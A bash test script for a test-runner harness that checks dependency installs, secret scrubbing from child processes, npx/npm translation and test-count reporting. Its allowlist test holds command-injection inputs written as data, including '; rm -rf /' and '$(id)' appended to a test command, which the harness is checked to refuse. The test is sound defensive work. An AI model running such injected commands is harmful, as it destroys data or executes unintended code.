printf '{}\n' > "$TMP/package.json"
: > "$TMP/bun.lock"
out="$(cd "$TMP" && dprep_ensure_js_deps)"
rc=$?
assert_eq "test1 rc" "0" "$rc"
assert_contains "test1 installing line" "dprep: installing JS dependencies (bun install --frozen-lockfile)" "$out"
assert_contains "test1 install ok" "dprep: install ok (" "$out"
assert_eq "test1 argv" "install --frozen-lockfile" "$(cat "$REC")"
assert_eq "test1 scrubbed GH_TOKEN" "GH_TOKEN=unset" "$(head -1 "$ENVREC")"
assert_eq "test1 kept TEST_URL" "TEST_URL=postgresql://localhost/phase15" "$(sed -n '2p' "$ENVREC")"
assert_eq "test1 scrubbed TELEGRAM_BOT_TOKEN" "BOT=unset" "$(sed -n '3p' "$ENVREC")"
assert_eq "test1 scrubbed TELEGRAM_STREAMING_MODE" "MODE=unset" "$(sed -n '4p' "$ENVREC")"
assert_eq "test1 scrubbed TELEGRAM_APPROVAL_CHAT_ID" "CHAT=unset" "$(sed -n '5p' "$ENVREC")"
assert_eq "test1 scrubbed TELEGRAM_ALLOWED_USER_IDS" "USERS=unset" "$(sed -n '6p' "$ENVREC")"
assert_eq "test1 kept TELEGRAM_TEST_FIXTURE" "FIX=fixture-value" "$(sed -n '7p' "$ENVREC")"
assert_not_contains "test1 stdout has no sentinel" "production-shaped-test-value" "$out"
assert_eq "test1 parent TELEGRAM_BOT_TOKEN remains" "production-shaped-test-value" "${TELEGRAM_BOT_TOKEN-unset}"
if [ -d "$TMP/node_modules" ]; then PASS=$((PASS + 1)); echo "PASS: test1 node_modules exists"; else FAIL=$((FAIL + 1)); echo "FAIL: test1 node_modules exists"; fi

echo "--- dprep copy 2: second extracted core scrubs telegram the same way ---"
C2BIN="$(mktemp -d)"
C2REC="$C2BIN/argv.txt"
C2ENV="$C2BIN/env.txt"
cat > "$C2BIN/bun" <<EOF
#!/usr/bin/env bash
printf '%s\\n' "\$*" >> "$C2REC"
printf 'GH_TOKEN=%s\\n' "\${GH_TOKEN-unset}" >> "$C2ENV"
printf 'TEST_URL=%s\\n' "\${DISPATCH_POSTGRES_PHASE15_TEST_URL-unset}" >> "$C2ENV"
printf 'BOT=%s\\n' "\${TELEGRAM_BOT_TOKEN-unset}" >> "$C2ENV"
printf 'MODE=%s\\n' "\${TELEGRAM_STREAMING_MODE-unset}" >> "$C2ENV"
printf 'CHAT=%s\\n' "\${TELEGRAM_APPROVAL_CHAT_ID-unset}" >> "$C2ENV"
printf 'USERS=%s\\n' "\${TELEGRAM_ALLOWED_USER_IDS-unset}" >> "$C2ENV"
printf 'FIX=%s\\n' "\${TELEGRAM_TEST_FIXTURE-unset}" >> "$C2ENV"
mkdir -p node_modules
EOF
chmod +x "$C2BIN/bun"
C2TMP="$(mktemp -d)"
printf '{}\n' > "$C2TMP/package.json"
: > "$C2TMP/bun.lock"
c2_out="$(
  eval "$(extract_core_nth "$CANONICAL_YAML" dprep 2)"
  cd "$C2TMP" || exit 1
  export PATH="$C2BIN:/usr/bin:/bin"
  export GH_TOKEN=production-shaped-test-value
  export DISPATCH_POSTGRES_PHASE15_TEST_URL=postgresql://localhost/phase15
  export TELEGRAM_BOT_TOKEN=production-shaped-test-value
  export TELEGRAM_STREAMING_MODE=production-shaped-test-value
  export TELEGRAM_APPROVAL_CHAT_ID=production-shaped-test-value
  export TELEGRAM_ALLOWED_USER_IDS=production-shaped-test-value
  export TELEGRAM_TEST_FIXTURE=fixture-value
  dprep_ensure_js_deps
)"
c2_rc=$?
assert_eq "copy2 rc" "0" "$c2_rc"
assert_eq "copy2 argv" "install --frozen-lockfile" "$(cat "$C2REC")"
assert_eq "copy2 scrubbed TELEGRAM_BOT_TOKEN" "BOT=unset" "$(sed -n '3p' "$C2ENV")"
assert_eq "copy2 scrubbed TELEGRAM_STREAMING_MODE" "MODE=unset" "$(sed -n '4p' "$C2ENV")"
assert_eq "copy2 scrubbed TELEGRAM_APPROVAL_CHAT_ID" "CHAT=unset" "$(sed -n '5p' "$C2ENV")"
assert_eq "copy2 scrubbed TELEGRAM_ALLOWED_USER_IDS" "USERS=unset" "$(sed -n '6p' "$C2ENV")"
assert_eq "copy2 kept TELEGRAM_TEST_FIXTURE" "FIX=fixture-value" "$(sed -n '7p' "$C2ENV")"
assert_not_contains "copy2 stdout has no sentinel" "production-shaped-test-value" "$c2_out"
assert_eq "copy2 parent TELEGRAM_BOT_TOKEN remains" "production-shaped-test-value" "${TELEGRAM_BOT_TOKEN-unset}"
rm -rf "$C2BIN" "$C2TMP"

echo "--- test 2: prep is idempotent and skips when not applicable ---"
out="$(cd "$TMP" && dprep_ensure_js_deps)"
rc=$?
assert_eq "test2 present rc" "0" "$rc"
assert_contains "test2 node_modules present" "dprep: node_modules present, skipping" "$out"
TMP2="$(mktemp -d)"
printf '{}\n' > "$TMP2/package.json"
out="$(cd "$TMP2" && dprep_ensure_js_deps)"
rc=$?
assert_eq "test2 no lock rc" "0" "$rc"
assert_contains "test2 no lock" "dprep: no package.json with a bun lockfile, skipping" "$out"
TMP3="$(mktemp -d)"
out="$(cd "$TMP3" && dprep_ensure_js_deps)"
rc=$?
assert_eq "test2 empty rc" "0" "$rc"
assert_contains "test2 empty dir" "dprep: no package.json with a bun lockfile, skipping" "$out"
assert_eq "test2 bun call count stays 1" "1" "$(wc -l < "$REC" | tr -d ' ')"

echo "--- test 3: missing bun skips cleanly ---"
TMP4="$(mktemp -d)"
printf '{}\n' > "$TMP4/package.json"
: > "$TMP4/bun.lock"
out="$(cd "$TMP4" && PATH="/usr/bin:/bin" dprep_ensure_js_deps)"
rc=$?
assert_eq "test3 rc" "0" "$rc"
assert_contains "test3 bun missing" "dprep: bun not found, skipping" "$out"

echo "--- test 4: a failed install never fails the run ---"
cat > "$BIN/bun" <<'EOF'
#!/usr/bin/env bash
exit 1
EOF
chmod +x "$BIN/bun"
TMP5="$(mktemp -d)"
(
  cd "$TMP5" || exit 1
  git init -q .
  git config user.email t@t
  git config user.name t
  printf '{}\n' > package.json
  printf '{}\n' > bun.lock
  git add package.json bun.lock
  git commit -qm base
  dprep_ensure_js_deps > "$TMP5/out"
  printf '%s\n' "$?" > "$TMP5/rc"
  git status --porcelain --untracked-files=no > "$TMP5/porcelain"
)
assert_eq "test4 rc" "0" "$(tr -d '[:space:]' < "$TMP5/rc")"
assert_contains "test4 failed install continues" "dprep: install failed rc=1 (continuing" "$(cat "$TMP5/out")"
assert_eq "test4 tracked files untouched" "" "$(cat "$TMP5/porcelain")"

echo "--- test 5: npx becomes bunx when npx is absent ---"
: > "$REC"
cat > "$BIN/bunx" <<EOF
#!/usr/bin/env bash
printf '%s\\n' "\$*" >> "$REC"
printf '      Tests  3 passed (3)\\n'
EOF
chmod +x "$BIN/bunx"
rm -f "$BIN/bun"
export PATH="$BIN:/usr/bin:/bin"
export RST_NPX_BIN="rst-npx-missing"
TMP6="$(mktemp -d)"
printf 'npx vitest run x.test.ts\n' > "$TMP6/cmds"
result="$(cd "$TMP6" && rst_run_commands ./cmds ./log)"
assert_eq "test5 counts" "0 3 3" "$result"
assert_eq "test5 bunx argv" "vitest run x.test.ts" "$(cat "$REC")"
assert_contains "test5 translation" "rst_run_commands: npx not found, running as: bunx vitest run x.test.ts" "$(cat "$TMP6/log")"
SOURCE=spec_declared
report="$(rst_report CODE 'npx vitest run x.test.ts' "${result%% *}" "${result#* }")"
assert_contains "test5 status" "TESTS_STATUS=passed" "$report"
assert_contains "test5 line" "TESTS_LINE=3/3 (npx vitest run x.test.ts)" "$report"
rm -f "$BIN/bunx"
cat > "$BIN/bun" <<EOF
#!/usr/bin/env bash
printf '%s\\n' "\$*" >> "$REC"
printf '      Tests  3 passed (3)\\n'
EOF
chmod +x "$BIN/bun"
: > "$REC"
result="$(cd "$TMP6" && rst_run_commands ./cmds ./logb)"
assert_eq "test5 bun x argv" "x vitest run x.test.ts" "$(cat "$REC")"
assert_contains "test5 bun x translation" "rst_run_commands: npx not found, running as: bun x vitest run x.test.ts" "$(cat "$TMP6/logb")"

echo "--- test 6: npm test becomes bun run test; real npx is left alone ---"
unset RST_NPX_BIN
export RST_NPM_BIN="rst-npm-missing"
: > "$REC"
cat > "$BIN/bun" <<EOF
#!/usr/bin/env bash
printf '%s\\n' "\$*" >> "$REC"
printf '      Tests  2 passed (2)\\n'
EOF
chmod +x "$BIN/bun"
TMP7="$(mktemp -d)"
printf 'npm test\n' > "$TMP7/cmds"
result="$(cd "$TMP7" && rst_run_commands ./cmds ./log)"
assert_eq "test6 bun argv" "run test" "$(cat "$REC")"
assert_contains "test6 npm translation" "rst_run_commands: npm not found, running as: bun run test" "$(cat "$TMP7/log")"
printf 'npm run unit -- --run extra.test.ts\n' > "$TMP7/cmds"
: > "$REC"
result="$(cd "$TMP7" && rst_run_commands ./cmds ./logr)"
assert_eq "test6 npm run argv" "run unit -- --run extra.test.ts" "$(cat "$REC")"
assert_contains "test6 npm run translation" "rst_run_commands: npm not found, running as: bun run unit -- --run extra.test.ts" "$(cat "$TMP7/logr")"
REC2="$BIN/npx-argv.txt"
cat > "$BIN/npx" <<EOF
#!/usr/bin/env bash
printf '%s\\n' "\$*" >> "$REC2"
printf '      Tests  1 passed (1)\\n'
EOF
chmod +x "$BIN/npx"
unset RST_NPX_BIN
printf 'npx vitest run y.test.ts\n' > "$TMP7/cmds"
result="$(cd "$TMP7" && rst_run_commands ./cmds ./logn)"
assert_eq "test6 npx argv" "vitest run y.test.ts" "$(cat "$REC2")"
assert_not_contains "test6 real npx not rewritten" "npx not found" "$(cat "$TMP7/logn")"
rm -f "$BIN/bun"
cat > "$BIN/npm" <<EOF
#!/usr/bin/env bash
printf '%s\\n' "\$*" >> "$REC"
printf '      Tests  2 passed (2)\\n'
EOF
chmod +x "$BIN/npm"
unset RST_NPM_BIN
: > "$REC"
printf 'npm test\n' > "$TMP7/cmds"
result="$(cd "$TMP7" && rst_run_commands ./cmds ./logm)"
assert_eq "test6 real npm argv" "test" "$(cat "$REC")"
assert_not_contains "test6 real npm not rewritten" "npm not found" "$(cat "$TMP7/logm")"

echo "--- test 7: the allowlist is not widened ---"
for c in \
  "npx vitest run x.test.ts; rm -rf /" \
  'npx vitest run $(id)' \
  "npm install" \
  "bunx -e 'x'"; do
  if rst_command_looks_runnable "$c"; then
    FAIL=$((FAIL + 1)); echo "FAIL: test7 not runnable expected: $c"
  else
    PASS=$((PASS + 1)); echo "PASS: test7 not runnable: $c"
  fi
done
INVOKED="$BIN/invoked"
rm -f "$INVOKED"
cat > "$BIN/bunx" <<EOF
#!/usr/bin/env bash
printf 'invoked\\n' >> "$INVOKED"
EOF
chmod +x "$BIN/bunx"
cat > "$BIN/npx" <<EOF
#!/usr/bin/env bash
printf 'invoked\\n' >> "$INVOKED"
EOF
chmod +x "$BIN/npx"
printf 'npx vitest run x.test.ts; rm -rf /\n' > "$TMP7/cmds"
result="$(cd "$TMP7" && rst_run_commands ./cmds ./log7)"
assert_contains "test7 refused" "rst_run_commands: refusing non-runnable command" "$(cat "$TMP7/log7")"
if [ -f "$INVOKED" ]; then
  FAIL=$((FAIL + 1)); echo "FAIL: test7 stub was invoked"
else
  PASS=$((PASS + 1)); echo "PASS: test7 stub was not invoked"
fi

echo "--- repeated scrub is stable and a child export does not touch the parent ---"
telegram_scrub_snapshot() {
  export TELEGRAM_BOT_TOKEN=production-shaped-test-value
  export TELEGRAM_STREAMING_MODE=production-shaped-test-value
  export TELEGRAM_APPROVAL_CHAT_ID=production-shaped-test-value
  export TELEGRAM_ALLOWED_USER_IDS=production-shaped-test-value
  export TELEGRAM_TEST_FIXTURE=fixture-value
  export DISPATCH_POSTGRES_PHASE15_TEST_URL=postgresql://localhost/phase15
  rst_scrub_env
  if [ "${1:-}" = "twice" ]; then rst_scrub_env; fi
  printf 'BOT=%s\nMODE=%s\nCHAT=%s\nUSERS=%s\nFIX=%s\nURL=%s\n' \
    "${TELEGRAM_BOT_TOKEN-unset}" \
    "${TELEGRAM_STREAMING_MODE-unset}" \
    "${TELEGRAM_APPROVAL_CHAT_ID-unset}" \
    "${TELEGRAM_ALLOWED_USER_IDS-unset}" \
    "${TELEGRAM_TEST_FIXTURE-unset}" \
    "${DISPATCH_POSTGRES_PHASE15_TEST_URL-unset}"
}
parent_bot_before="${TELEGRAM_BOT_TOKEN-unset}"
ONCE_SNAP="$(telegram_scrub_snapshot)"
TWICE_SNAP="$(telegram_scrub_snapshot twice)"
assert_eq "t3 two scrubs match one" "$ONCE_SNAP" "$TWICE_SNAP"
assert_eq "t3 scrub subshell leaves parent token" "$parent_bot_before" "${TELEGRAM_BOT_TOKEN-unset}"
export TELEGRAM_BOT_TOKEN=production-shaped-test-value
bash -c 'export TELEGRAM_BOT_TOKEN=in-test-fake'
assert_eq "t3 child export leaves parent token" "production-shaped-test-value" "${TELEGRAM_BOT_TOKEN-unset}"

echo "--- rst_run_commands child boundary removes operational telegram names ---"
RST_TG="$(mktemp -d)"
cat > "$RST_TG/probe.sh" <<'EOF'
#!/usr/bin/env bash
printf 'BOT=%s\n' "${TELEGRAM_BOT_TOKEN-unset}"
printf 'MODE=%s\n' "${TELEGRAM_STREAMING_MODE-unset}"
printf 'CHAT=%s\n' "${TELEGRAM_APPROVAL_CHAT_ID-unset}"
printf 'USERS=%s\n' "${TELEGRAM_ALLOWED_USER_IDS-unset}"
printf 'FIX=%s\n' "${TELEGRAM_TEST_FIXTURE-unset}"
printf 'Tests: 1/1\n'
EOF
chmod +x "$RST_TG/probe.sh"
printf 'bash ./probe.sh\n' > "$RST_TG/cmds"
export TELEGRAM_BOT_TOKEN=production-shaped-test-value
export TELEGRAM_STREAMING_MODE=production-shaped-test-value
export TELEGRAM_APPROVAL_CHAT_ID=production-shaped-test-value
export TELEGRAM_ALLOWED_USER_IDS=production-shaped-test-value
export TELEGRAM_TEST_FIXTURE=fixture-value
rst_summary="$(cd "$RST_TG" && rst_run_commands ./cmds ./log)"
assert_eq "t4 rst child exit and counts" "0 1 1" "$rst_summary"
assert_eq "t4 child TELEGRAM_BOT_TOKEN unset" "BOT=unset" "$(grep -x 'BOT=unset' "$RST_TG/log" | head -1)"
assert_eq "t4 child TELEGRAM_STREAMING_MODE unset" "MODE=unset" "$(grep -x 'MODE=unset' "$RST_TG/log" | head -1)"
assert_eq "t4 child TELEGRAM_APPROVAL_CHAT_ID unset" "CHAT=unset" "$(grep -x 'CHAT=unset' "$RST_TG/log" | head -1)"
assert_eq "t4 child TELEGRAM_ALLOWED_USER_IDS unset" "USERS=unset" "$(grep -x 'USERS=unset' "$RST_TG/log" | head -1)"
assert_eq "t4 child TELEGRAM_TEST_FIXTURE kept" "FIX=fixture-value" "$(grep -x 'FIX=fixture-value' "$RST_TG/log" | head -1)"
assert_contains "t4 log keeps original command" "### run-stop-tests: bash ./probe.sh" "$(cat "$RST_TG/log")"
assert_not_contains "t4 log has no sentinel" "production-shaped-test-value" "$(cat "$RST_TG/log")"
assert_eq "t4 parent TELEGRAM_BOT_TOKEN unchanged" "production-shaped-test-value" "${TELEGRAM_BOT_TOKEN-unset}"

echo "--- genuine failing counts stay blocking ---"
T5="$(mktemp -d)"
cat > "$T5/fail.sh" <<'EOF'
#!/usr/bin/env bash
printf 'Tests: 0/1\n'
exit 1
EOF
chmod +x "$T5/fail.sh"
printf 'bash ./fail.sh\n' > "$T5/cmds"
t5_result="$(cd "$T5" && rst_run_commands ./cmds ./log)"
assert_eq "t5 rst_run_commands exit and counts" "1 0 1" "$t5_result"
t5_exit="${t5_result%% *}"
t5_counts="${t5_result#* }"
t5_report="$(rst_report CODE 'bash ./fail.sh' "$t5_exit" "$t5_counts")"
assert_contains "t5 TESTS_STATUS failed" "TESTS_STATUS=failed" "$t5_report"
assert_contains "t5 TESTS_LINE has 0/1" "0/1" "$t5_report"
assert_contains "t5 TESTS_LINE has FAILED" "FAILED" "$t5_report"

echo "--- absent telegram names stay a no-op ---"
T6_EMPTY="$(mktemp -d)"
T6="$(
  unset TELEGRAM_BOT_TOKEN TELEGRAM_STREAMING_MODE TELEGRAM_APPROVAL_CHAT_ID TELEGRAM_ALLOWED_USER_IDS
  rst_scrub_env
  printf 'rc1=%s\n' "$?"
  s1="$(printf '%s\n' "${TELEGRAM_BOT_TOKEN-absent}" "${TELEGRAM_STREAMING_MODE-absent}" "${TELEGRAM_APPROVAL_CHAT_ID-absent}" "${TELEGRAM_ALLOWED_USER_IDS-absent}" "${PATH}" "${HOME}")"
  rst_scrub_env
  printf 'rc2=%s\n' "$?"
  s2="$(printf '%s\n' "${TELEGRAM_BOT_TOKEN-absent}" "${TELEGRAM_STREAMING_MODE-absent}" "${TELEGRAM_APPROVAL_CHAT_ID-absent}" "${TELEGRAM_ALLOWED_USER_IDS-absent}" "${PATH}" "${HOME}")"
  if [ "$s1" = "$s2" ]; then printf 'same=yes\n'; else printf 'same=no\n'; fi
  dprep_out="$(cd "$T6_EMPTY" && dprep_ensure_js_deps)"
  printf 'dprep_rc=%s\n' "$?"
  printf 'dprep_out=%s\n' "$dprep_out"
)"
assert_eq "t6 first scrub rc" "rc1=0" "$(printf '%s\n' "$T6" | sed -n '1p')"
assert_eq "t6 second scrub rc" "rc2=0" "$(printf '%s\n' "$T6" | sed -n '2p')"
assert_eq "t6 repeated scrub identical" "same=yes" "$(printf '%s\n' "$T6" | sed -n '3p')"
assert_eq "t6 dprep skip rc" "dprep_rc=0" "$(printf '%s\n' "$T6" | sed -n '4p')"
assert_contains "t6 dprep skip path" "dprep: no package.json with a bun lockfile, skipping" "$(printf '%s\n' "$T6" | sed -n '5p')"

echo "--- pass plus no-count or zero-count never reports passed ---"
MIX="$(mktemp -d)"
cat > "$MIX/ok.sh" <<'EOF'
#!/bin/sh
echo "Tests: 1/1"
exit 0
EOF
cat > "$MIX/nocount.sh" <<'EOF'
#!/bin/sh
echo "no counts here"
exit 0
EOF
cat > "$MIX/zero.sh" <<'EOF'
#!/bin/sh
echo "Tests: 0/0"
exit 0
EOF
cat > "$MIX/impossible.sh" <<'EOF'
#!/bin/sh
echo "Tests: 4/3"
exit 0
EOF
chmod +x "$MIX/ok.sh" "$MIX/nocount.sh" "$MIX/zero.sh" "$MIX/impossible.sh"
printf 'bash ./ok.sh\nbash ./nocount.sh\n' > "$MIX/cmds"
mix_nc="$(cd "$MIX" && rst_run_commands ./cmds ./log-nc)"
assert_eq "pass plus no-count is blank counts" "0  " "$mix_nc"
assert_contains "pass plus no-count keeps the passing command" "### run-stop-tests: bash ./ok.sh" "$(cat "$MIX/log-nc")"
assert_contains "pass plus no-count keeps the blank command" "### run-stop-tests: bash ./nocount.sh" "$(cat "$MIX/log-nc")"
nc_exit="${mix_nc%% *}"
nc_counts="$(printf '%s' "${mix_nc#* }" | sed 's/^[[:space:]]*//; s/[[:space:]]*$//')"
nc_report="$(SOURCE=spec_declared rst_report CODE 'bash ./ok.sh; bash ./nocount.sh' "$nc_exit" "$nc_counts")"
assert_contains "pass plus no-count is counts_unparsed" "TESTS_STATUS=counts_unparsed" "$nc_report"
assert_not_contains "pass plus no-count is not passed" "TESTS_STATUS=passed" "$nc_report"
printf 'bash ./ok.sh\nbash ./zero.sh\n' > "$MIX/cmds"
mix_z="$(cd "$MIX" && rst_run_commands ./cmds ./log-z)"
assert_eq "pass plus 0/0 publishes 0 0 0" "0 0 0" "$mix_z"
assert_contains "pass plus 0/0 keeps the zero member" "### run-stop-tests: bash ./zero.sh" "$(cat "$MIX/log-z")"
z_exit="${mix_z%% *}"
z_counts="$(printf '%s' "${mix_z#* }" | sed 's/^[[:space:]]*//; s/[[:space:]]*$//')"
z_report="$(rst_report CODE 'bash ./ok.sh; bash ./zero.sh' "$z_exit" "$z_counts")"
assert_contains "pass plus 0/0 is failed" "TESTS_STATUS=failed" "$z_report"
assert_not_contains "pass plus 0/0 is not passed" "TESTS_STATUS=passed" "$z_report"
printf 'bash ./impossible.sh\n' > "$MIX/cmds"
mix_i="$(cd "$MIX" && rst_run_commands ./cmds ./log-i)"
i_exit="${mix_i%% *}"
i_counts="$(printf '%s' "${mix_i#* }" | sed 's/^[[:space:]]*//; s/[[:space:]]*$//')"
assert_eq "impossible 4/3 uses a nonzero exit" "1" "$i_exit"
assert_eq "impossible 4/3 blanks counts" "" "$i_counts"
i_report="$(SOURCE=spec_declared rst_report CODE 'bash ./impossible.sh' "$i_exit" "$i_counts")"
assert_not_contains "impossible 4/3 is not passed" "TESTS_STATUS=passed" "$i_report"

echo "--- chained pass && zero-count or no-count never publishes 0 1 1 ---"
printf 'bash ./ok.sh && bash ./zero.sh\n' > "$MIX/cmds"
mix_cz="$(cd "$MIX" && rst_run_commands ./cmds ./log-cz)"
assert_eq "chained pass && zero-count publishes 0 0 0" "0 0 0" "$mix_cz"
assert_not_contains "chained pass && zero-count is not 0 1 1" "0 1 1" "$mix_cz"
cz_exit="${mix_cz%% *}"
cz_counts="$(printf '%s' "${mix_cz#* }" | sed 's/^[[:space:]]*//; s/[[:space:]]*$//')"
cz_report="$(rst_report CODE 'bash ./ok.sh && bash ./zero.sh' "$cz_exit" "$cz_counts")"
assert_contains "chained pass && zero-count is failed" "TESTS_STATUS=failed" "$cz_report"
assert_not_contains "chained pass && zero-count is not passed" "TESTS_STATUS=passed" "$cz_report"
printf 'bash ./ok.sh && bash ./nocount.sh\n' > "$MIX/cmds"
mix_cn="$(cd "$MIX" && rst_run_commands ./cmds ./log-cn)"
assert_eq "chained pass && no-count publishes blank counts" "0  " "$mix_cn"
assert_not_contains "chained pass && no-count is not 0 1 1" "0 1 1" "$mix_cn"
cn_exit="${mix_cn%% *}"
cn_counts="$(printf '%s' "${mix_cn#* }" | sed 's/^[[:space:]]*//; s/[[:space:]]*$//')"
cn_report="$(SOURCE=spec_declared rst_report CODE 'bash ./ok.sh && bash ./nocount.sh' "$cn_exit" "$cn_counts")"
assert_contains "chained pass && no-count is counts_unparsed" "TESTS_STATUS=counts_unparsed" "$cn_report"
assert_not_contains "chained pass && no-count is not passed" "TESTS_STATUS=passed" "$cn_report"
printf 'bash ./ok.sh && bash ./ok.sh\n' > "$MIX/cmds"
mix_cc="$(cd "$MIX" && rst_run_commands ./cmds ./log-cc)"
assert_eq "chained two passing segments publish 0 2 2" "0 2 2" "$mix_cc"
cc_exit="${mix_cc%% *}"
cc_counts="$(printf '%s' "${mix_cc#* }" | sed 's/^[[:space:]]*//; s/[[:space:]]*$//')"
cc_report="$(rst_report CODE 'bash ./ok.sh && bash ./ok.sh' "$cc_exit" "$cc_counts")"
assert_contains "chained two passing segments are passed" "TESTS_STATUS=passed" "$cc_report"
rm -rf "$MIX"

echo "--- leading Expected without a command is explicit, not absence ---"
MAL_SPEC="$(printf '%s\n' \
  'Stop 1 (test suite):' \
  '  Expected: all passing' \
  '' \
  'Stop 2 (test suite):' \
  '  bash ./ok.sh' \
  '  Expected: 1')"
MAL_EXTRACT="$(printf '%s\n' "$MAL_SPEC" | rst_extract_commands)"
assert_eq "leading Expected keeps malformed and later command" "$(printf '%s\n' 'MALFORMED:expected-without-command' 'bash ./ok.sh')" "$MAL_EXTRACT"
MAL="$(mktemp -d)"
(
  cd "$MAL" || exit 1
  cat > ok.sh <<'EOF'
#!/bin/sh
echo "Tests: 1/1"
exit 0
EOF
  cat > map-pass.sh <<'EOF'
#!/bin/sh
echo MAP_SENTINEL
echo "Tests: 1/1"
exit 0
EOF
  chmod +x ok.sh map-pass.sh
  printf '%s\n' '{"scripts":{"test":"echo REPO_SENTINEL"}}' > package.json
  touch bun.lock
)
MAL_CMDS="$MAL/cmds"
MAL_DECL="$(
  cd "$MAL" || exit 1
  printf '%s\n' "$MAL_SPEC" | rst_load_explicit "$MAL_CMDS"
)"
assert_eq "malformed explicit declaration flag" "1" "$MAL_DECL"
if [ "$MAL_DECL" -eq 0 ]; then
  (
    cd "$MAL" || exit 1
    rst_apply_fallback "$MAL_CMDS" "" project-map "bash ./map-pass.sh" >/dev/null
  )
fi
MAL_BODY="$(cat "$MAL_CMDS")"
assert_contains "malformed member stays in the command file" "MALFORMED:expected-without-command" "$MAL_BODY"
assert_contains "later command stays in the command file" "bash ./ok.sh" "$MAL_BODY"
assert_not_contains "malformed member does not select project-map" "map-pass" "$MAL_BODY"
assert_not_contains "malformed member does not select repo script" "bun run test" "$MAL_BODY"
MAL_RUN="$(cd "$MAL" && rst_run_commands "$MAL_CMDS" "$MAL/log")"
MAL_EXIT="${MAL_RUN%% *}"
MAL_COUNTS="$(printf '%s' "${MAL_RUN#* }" | sed 's/^[[:space:]]*//; s/[[:space:]]*$//')"
MAL_REPORT="$(SOURCE=spec_declared rst_report CODE 'MALFORMED:expected-without-command; bash ./ok.sh' "$MAL_EXIT" "$MAL_COUNTS")"
assert_not_contains "malformed explicit member is not passed" "TESTS_STATUS=passed" "$MAL_REPORT"
assert_not_contains "map sentinel did not run" "MAP_SENTINEL" "$(cat "$MAL/log")"
assert_not_contains "repo sentinel did not run" "REPO_SENTINEL" "$(cat "$MAL/log")"

echo "--- true absence selects project-map, then the repo script, ahead of neither for diff tests ---"
ABS="$(mktemp -d)"
(
  cd "$ABS" || exit 1
  cat > map-pass.sh <<'EOF'
#!/bin/sh
echo "Tests: 1/1"
exit 0
EOF
  chmod +x map-pass.sh
  printf '%s\n' '{"scripts":{"test":"echo 1"}}' > package.json
)
ABS_SPEC="$(printf '%s\n' 'Stop 1 (grep assertion):' '  grep -c base README' '  Expected: 1')"
ABS_CMDS="$ABS/cmds"
ABS_DECL="$(
  cd "$ABS" || exit 1
  printf '%s\n' "$ABS_SPEC" | rst_load_explicit "$ABS_CMDS"
)"
assert_eq "grep-only spec declares no tests" "0" "$ABS_DECL"
ABS_SRC="$(
  cd "$ABS" || exit 1
  rst_apply_fallback "$ABS_CMDS" "" project-map "bash ./map-pass.sh"
)"
assert_eq "absence with a map command selects project-map" "project-map" "$ABS_SRC"
assert_eq "project-map command file" "bash ./map-pass.sh" "$(cat "$ABS_CMDS")"
ABS_RUN="$(cd "$ABS" && rst_run_commands "$ABS_CMDS" "$ABS/map.log")"
assert_eq "project-map executes 1/1" "0 1 1" "$ABS_RUN"
ABS_EXIT="${ABS_RUN%% *}"
ABS_COUNTS="$(printf '%s' "${ABS_RUN#* }" | sed 's/^[[:space:]]*//; s/[[:space:]]*$//')"
ABS_REPORT="$(rst_report CODE 'bash ./map-pass.sh' "$ABS_EXIT" "$ABS_COUNTS")"
assert_contains "project-map pass is published" "TESTS_STATUS=passed" "$ABS_REPORT"
REPO_SRC="$(
  cd "$ABS" || exit 1
  rm -f bun.lock bun.lockb
  rst_apply_fallback "$ABS_CMDS" "" wo-spec ""
)"
assert_eq "absent map without a bun lock selects repo_test_script" "repo_test_script" "$REPO_SRC"
assert_eq "repo script without a bun lock is npm test" "npm test" "$(cat "$ABS_CMDS")"
touch "$ABS/bun.lock"
REPO_BUN="$(
  cd "$ABS" || exit 1
  rst_apply_fallback "$ABS_CMDS" "" wo-spec ""
)"
assert_eq "absent map with a bun lock selects repo_test_script" "repo_test_script" "$REPO_BUN"
assert_eq "repo script with a bun lock is bun run test" "bun run test" "$(cat "$ABS_CMDS")"

DIFF="$(mktemp -d)"
git -C "$DIFF" init -q
git -C "$DIFF" config user.email t@example.com
git -C "$DIFF" config user.name Test
printf 'base\n' > "$DIFF/README"
git -C "$DIFF" add README
git -C "$DIFF" commit -qm base
printf 'test("x", () => {})\n' > "$DIFF/sample.test.js"
DIFF_SHA="$(git -C "$DIFF" rev-parse HEAD)"
DIFF_CMDS="$DIFF/cmds"
DIFF_SRC="$(
  cd "$DIFF" || exit 1
  rst_apply_fallback "$DIFF_CMDS" "$DIFF_SHA" project-map "bash ./map-pass.sh"
)"
assert_eq "untracked test file selects tests_in_diff ahead of the map" "tests_in_diff" "$DIFF_SRC"
assert_contains "diff command names the untracked test" "sample.test.js" "$(cat "$DIFF_CMDS")"
assert_not_contains "diff selection does not use the map command" "map-pass" "$(cat "$DIFF_CMDS")"

echo "--- all 13 lanes invoke the shared explicit loader and fallback ---"
for lane in $LANES; do
  assert_eq "rst_load_explicit call $lane" "1" "$(grep -F -c 'rst_load_explicit "$CMDS"' "$DEFAULTS/$lane")"
  assert_eq "rst_apply_fallback call $lane" "1" "$(grep -F -c 'rst_apply_fallback "$CMDS"' "$DEFAULTS/$lane")"
done
rm -rf "$MAL" "$ABS" "$DIFF"
echo "--- dprep pnpm lockfile branch ---"
PBIN="$(mktemp -d)"
PREC="$PBIN/pnpm-argv.txt"
PENV="$PBIN/pnpm-env.txt"
BREC="$PBIN/bun-argv.txt"
cat > "$PBIN/pnpm" <<EOF
#!/usr/bin/env bash
printf '%s\\n' "\$*" >> "$PREC"
printf 'GH_TOKEN=%s\\n' "\${GH_TOKEN-unset}" >> "$PENV"
EOF
cat > "$PBIN/bun" <<EOF
#!/usr/bin/env bash
printf '%s\\n' "\$*" >> "$BREC"
EOF
chmod +x "$PBIN/pnpm" "$PBIN/bun"
export GH_TOKEN=production-shaped-test-value

echo "--- pnpm a: pnpm-lock.yaml and no node_modules installs frozen ---"
: > "$PREC"
: > "$PENV"
: > "$BREC"
PTMP="$(mktemp -d)"
printf '{}\n' > "$PTMP/package.json"
: > "$PTMP/pnpm-lock.yaml"
pout="$(cd "$PTMP" && PATH="$PBIN:/usr/bin:/bin" dprep_ensure_js_deps)"
prc=$?
assert_eq "pnpm a rc" "0" "$prc"
assert_eq "pnpm a argv" "install --frozen-lockfile" "$(cat "$PREC")"
assert_eq "pnpm a GH_TOKEN scrubbed" "GH_TOKEN=unset" "$(head -1 "$PENV")"
assert_eq "pnpm a parent GH_TOKEN remains" "production-shaped-test-value" "${GH_TOKEN-unset}"
assert_contains "pnpm a installing line" "dprep: installing JS dependencies (pnpm, frozen lockfile)" "$pout"
